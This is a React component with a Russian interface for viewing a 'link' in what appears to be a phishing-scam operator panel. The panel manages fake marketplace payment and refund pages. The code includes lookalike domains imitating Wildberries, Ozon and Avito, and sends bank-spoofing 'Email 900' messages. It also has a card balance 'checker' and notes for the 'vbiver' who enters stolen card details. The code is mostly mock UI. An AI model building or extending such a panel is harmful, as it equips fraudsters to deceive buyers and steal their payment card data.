import { motion } from "framer-motion";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Switch } from "@/components/ui/switch";
import { ArrowLeft, Package, Mail, Edit, Trash2, StickyNote, Copy, Wifi } from "lucide-react";
import { useNavigate, useParams } from "react-router-dom";
import { useState } from "react";
import { useToast } from "@/hooks/use-toast";

const ViewLink = () => {
  const navigate = useNavigate();
  const { id } = useParams();
  const { toast } = useToast();
  const [checkerBalance, setCheckerBalance] = useState(false);
  const [cashback, setCashback] = useState(true);
  const [info900, setInfo900] = useState(false);
  const [note, setNote] = useState("");
  const [email, setEmail] = useState("");
  const [selectedDomain, setSelectedDomain] = useState<string | null>(null);

  // Моковые домены для выбора
  const mockDomains = [
    { name: "wb-helper.ru", status: "working" },
    { name: "ozon-market.ru", status: "working" },
    { name: "avito-realty.com", status: "not-working" },
    { name: "marketplace-api.com", status: "working" }
  ];

  // Данные ссылки (в реальном приложении будут загружаться по ID)
  const linkData = {
    id: id || "12345",
    product: "Телевизор Philips 65\"",
    price: "10000Р",
    pvzDelivery: "1000Р",
    courierDelivery: "1000Р",
    paymentUrl: "https://example.com/payment",
    returnUrl: "https://example.com/return"
  };

  const handleEmailSend = (type: string, service: string) => {
    console.log(`Отправка ${type} email через ${service} на адрес: ${email}`);
    setEmail("");
  };

  const handleDeleteNote = () => {
    setNote("");
  };

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Скопировано!",
      description: `${label} скопирован в буфер обмена`,
    });
  };

  const handleDomainChange = () => {
    if (selectedDomain) {
      toast({
        title: "Домен изменен!",
        description: `Домен изменен на ${selectedDomain}`,
      });
      setSelectedDomain(null);
    }
  };

  return (
    <motion.div 
      className="min-h-screen bg-background"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      transition={{ duration: 0.3 }}
    >
      <motion.div 
        className="max-w-md mx-auto p-4 space-y-4"
        initial={{ y: 20 }}
        animate={{ y: 0 }}
        transition={{ duration: 0.4 }}
      >
        <motion.div 
          className="flex items-center gap-4 mb-6"
          initial={{ x: -20, opacity: 0 }}
          animate={{ x: 0, opacity: 1 }}
          transition={{ duration: 0.3, delay: 0.1 }}
        >
          <Button
            variant="ghost"
            size="icon"
            onClick={() => navigate("/my-links")}
            className="h-10 w-10 rounded-full hover:bg-primary/20"
          >
            <ArrowLeft className="h-5 w-5" />
          </Button>
          <h1 className="text-xl font-semibold">Просмотр ссылки</h1>
        </motion.div>

        {/* Основная информация */}
        <motion.div
          initial={{ scale: 0.95, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{ duration: 0.3, delay: 0.2 }}
        >
          <Card className="bg-gradient-card shadow-card border-0">
          <CardHeader>
            <CardTitle>Информация о ссылке</CardTitle>
          </CardHeader>
          <CardContent className="space-y-3">
            <div className="flex justify-between">
              <span className="text-muted-foreground">ID ссылки:</span>
              <span className="font-medium">{linkData.id}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-muted-foreground">Товар:</span>
              <span className="font-medium">{linkData.product}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-muted-foreground">Стоимость товара:</span>
              <span className="font-medium">{linkData.price}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-muted-foreground">Стоимость доставки в ПВЗ:</span>
              <span className="font-medium">{linkData.pvzDelivery}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-muted-foreground">Стоимость доставки курьером:</span>
              <span className="font-medium">{linkData.courierDelivery}</span>
            </div>
            <div className="flex justify-between items-center">
              <span className="text-muted-foreground">Оплата:</span>
              <div className="flex items-center gap-2">
                <span className="text-sm font-medium truncate max-w-32">{linkData.paymentUrl}</span>
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={() => copyToClipboard(linkData.paymentUrl, "URL оплаты")}
                  className="h-6 w-6 p-0"
                >
                  <Copy className="h-3 w-3" />
                </Button>
              </div>
            </div>
            <div className="flex justify-between items-center">
              <span className="text-muted-foreground">Возврат:</span>
              <div className="flex items-center gap-2">
                <span className="text-sm font-medium truncate max-w-32">{linkData.returnUrl}</span>
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={() => copyToClipboard(linkData.returnUrl, "URL возврата")}
                  className="h-6 w-6 p-0"
                >
                  <Copy className="h-3 w-3" />
                </Button>
              </div>
            </div>
          </CardContent>
        </Card>
        </motion.div>

        {/* Кнопки действий */}
        <motion.div
          initial={{ scale: 0.95, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{ duration: 0.3, delay: 0.3 }}
        >
          <Card className="bg-gradient-card shadow-card border-0">
          <CardContent className="p-4 space-y-3">
            <Dialog>
              <DialogTrigger asChild>
                <Button variant="outline" className="w-full justify-start">
                  <Wifi className="h-4 w-4 mr-2" />
                  Подключить API
                </Button>
              </DialogTrigger>
              <DialogContent>
                <DialogHeader>
                  <DialogTitle>API подключение</DialogTitle>
                </DialogHeader>
                <div className="space-y-4">
                  <div className="space-y-2">
                    <Label>API URL:</Label>
                    <div className="flex items-center gap-2">
                      <Input
                        value="https://api.example.com/payment"
                        readOnly
                        className="flex-1"
                      />
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => copyToClipboard("https://api.example.com/payment", "API URL")}
                      >
                        <Copy className="h-4 w-4" />
                      </Button>
                    </div>
                  </div>
                  <div className="space-y-2">
                    <Label>GET запрос:</Label>
                    <div className="flex items-center gap-2">
                      <Input
                        value="GET /payment?sum=1000"
                        readOnly
                        className="flex-1"
                      />
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => copyToClipboard("GET /payment?sum=1000", "GET запрос")}
                      >
                        <Copy className="h-4 w-4" />
                      </Button>
                    </div>
                  </div>
                </div>
              </DialogContent>
            </Dialog>

            {/* Email 900 */}
            <div className="flex gap-2">
              <Dialog>
                <DialogTrigger asChild>
                  <Button variant="outline" className="flex-1 text-xs">
                    Email 900 [оплата]
                  </Button>
                </DialogTrigger>
                <DialogContent>
                  <DialogHeader>
                    <DialogTitle>Email 900 - Оплата</DialogTitle>
                  </DialogHeader>
                  <div className="space-y-4">
                    <div className="space-y-2">
                      <Label>E-mail адрес</Label>
                      <Input
                        type="email"
                        placeholder="example@email.com"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                      />
                    </div>
                    <Button 
                      className="w-full"
                      onClick={() => handleEmailSend("оплата", "900")}
                      disabled={!email}
                    >
                      Отправить
                    </Button>
                  </div>
                </DialogContent>
              </Dialog>

              <Dialog>
                <DialogTrigger asChild>
                  <Button variant="outline" className="flex-1 text-xs">
                    Email 900 [возврат]
                  </Button>
                </DialogTrigger>
                <DialogContent>
                  <DialogHeader>
                    <DialogTitle>Email 900 - Возврат</DialogTitle>
                  </DialogHeader>
                  <div className="space-y-4">
                    <div className="space-y-2">
                      <Label>E-mail адрес</Label>
                      <Input
                        type="email"
                        placeholder="example@email.com"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                      />
                    </div>
                    <Button 
                      className="w-full"
                      onClick={() => handleEmailSend("возврат", "900")}
                      disabled={!email}
                    >
                      Отправить
                    </Button>
                  </div>
                </DialogContent>
              </Dialog>
            </div>

            {/* Email PixMail */}
            <div className="flex gap-2">
              <Dialog>
                <DialogTrigger asChild>
                  <Button variant="outline" className="flex-1 text-xs">
                    Email PixMail [оплата]
                  </Button>
                </DialogTrigger>
                <DialogContent>
                  <DialogHeader>
                    <DialogTitle>Email PixMail - Оплата</DialogTitle>
                  </DialogHeader>
                  <div className="space-y-4">
                    <div className="space-y-2">
                      <Label>E-mail адрес</Label>
                      <Input
                        type="email"
                        placeholder="example@email.com"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                      />
                    </div>
                    <Button 
                      className="w-full"
                      onClick={() => handleEmailSend("оплата", "PixMail")}
                      disabled={!email}
                    >
                      Отправить
                    </Button>
                  </div>
                </DialogContent>
              </Dialog>

              <Dialog>
                <DialogTrigger asChild>
                  <Button variant="outline" className="flex-1 text-xs">
                    Email PixMail [возврат]
                  </Button>
                </DialogTrigger>
                <DialogContent>
                  <DialogHeader>
                    <DialogTitle>Email PixMail - Возврат</DialogTitle>
                  </DialogHeader>
                  <div className="space-y-4">
                    <div className="space-y-2">
                      <Label>E-mail адрес</Label>
                      <Input
                        type="email"
                        placeholder="example@email.com"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                      />
                    </div>
                    <Button 
                      className="w-full"
                      onClick={() => handleEmailSend("возврат", "PixMail")}
                      disabled={!email}
                    >
                      Отправить
                    </Button>
                  </div>
                </DialogContent>
              </Dialog>
            </div>
          </CardContent>
        </Card>
        </motion.div>

        {/* Переключатели */}
        <motion.div
          initial={{ scale: 0.95, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{ duration: 0.3, delay: 0.4 }}
        >
          <Card className="bg-gradient-card shadow-card border-0">
          <CardContent className="p-4 space-y-4">
            <div className="flex items-center justify-between">
              <Label>Чекер баланса</Label>
              <Switch checked={checkerBalance} onCheckedChange={setCheckerBalance} />
            </div>
            <div className="flex items-center justify-between">
              <Label>Кешбек</Label>
              <Switch checked={cashback} onCheckedChange={setCashback} />
            </div>
            <div className="flex items-center justify-between">
              <Label>Инфо о 900</Label>
              <Switch checked={info900} onCheckedChange={setInfo900} />
            </div>
          </CardContent>
        </Card>
        </motion.div>

        {/* Заметка вбиверу */}
        <motion.div
          initial={{ scale: 0.95, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{ duration: 0.3, delay: 0.5 }}
        >
          <Card className="bg-gradient-card shadow-card border-0">
          <CardContent className="p-4">
            <Dialog>
              <DialogTrigger asChild>
                <Button variant="outline" className="w-full justify-start">
                  <StickyNote className="h-4 w-4 mr-2" />
                  Заметка вбиверу
                </Button>
              </DialogTrigger>
              <DialogContent>
                <DialogHeader>
                  <DialogTitle>Заметка для вбивера</DialogTitle>
                </DialogHeader>
                <div className="space-y-4">
                  <div className="space-y-2">
                    <Label>Текст заметки</Label>
                    <Textarea
                      placeholder="Введите заметку для вбивера..."
                      value={note}
                      onChange={(e) => setNote(e.target.value)}
                      rows={4}
                    />
                  </div>
                  <div className="flex gap-2">
                    <Button className="flex-1">Сохранить</Button>
                    <Button 
                      variant="destructive" 
                      onClick={handleDeleteNote}
                      disabled={!note}
                    >
                      Удалить заметку
                    </Button>
                  </div>
                </div>
              </DialogContent>
            </Dialog>
          </CardContent>
        </Card>
        </motion.div>

        {/* Кнопки управления */}
        <motion.div 
          className="flex gap-3"
          initial={{ y: 20, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          transition={{ duration: 0.4, delay: 0.6 }}
        >
          <Button 
            variant="outline" 
            className="flex-1"
            onClick={() => navigate(`/edit-link/${id}`)}
          >
            <Edit className="h-4 w-4 mr-2" />
            Изменить
          </Button>

          <Button variant="destructive" className="flex-1">
            <Trash2 className="h-4 w-4 mr-2" />
            Удалить
          </Button>
        </motion.div>
      </motion.div>
    </motion.div>
  );
};

export default ViewLink;